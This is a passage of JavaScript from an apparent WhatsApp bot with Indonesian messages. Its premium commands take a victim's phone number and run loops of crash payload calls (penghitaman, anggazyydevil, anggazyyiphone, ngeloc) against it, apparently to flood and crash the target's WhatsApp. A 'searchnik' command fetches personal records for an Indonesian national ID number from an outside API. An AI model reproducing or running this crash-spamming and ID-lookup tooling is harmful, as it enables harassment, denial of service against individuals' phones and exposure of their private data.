await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case '🗡': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'searchnik': {
const ucword = (str = '') => {
return str.replace(/^([a-z])|\s+([a-z])/g, function (text) {
return text.toUpperCase();
   })
  }
  if (!text) return reply('Input nik yang ingin kamu cek.')
  if (isNaN(args[0])) return reply(`Example : ${prefix + command} 28199xxxxxxxxxx`)
  if (args[0].toString()
   .length !== 16) return reply('NIK 16 digit.')
  let result = await fetch(`https://suryadev.vercel.app/api/ceknik?nik=${args[0]}`)
   .then(response => response.json())
  if (!result.status) return reply(result.message)
  delete result.status;
  delete result.creator;
  delete result.message;
  let resultTxt = 'C E K - N I K\n\n'
  for (let key in result.data) resultTxt +=`◦  ${ucword(key)} : ${result.data[key]}\n`
  await reply(resultTxt)
 }
 break
case '🔧': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case '⚙️': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case '🍌': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case '🎭': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case '👻': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'jomok-blank': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'mampuslu': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break

case 'goyang': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'jomok': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'kekuatanhitam': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break;
case 'cringe': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break

case 'bug-waweb': {
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Usage .${command} 62xxxx`)
let anggazyyweb = q.replace(/[^0-9]/g, "")
if (anggazyyweb.startsWith('0')) return reply(`Example : .${command} 62xxxx`)
let target = anggazyyweb + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
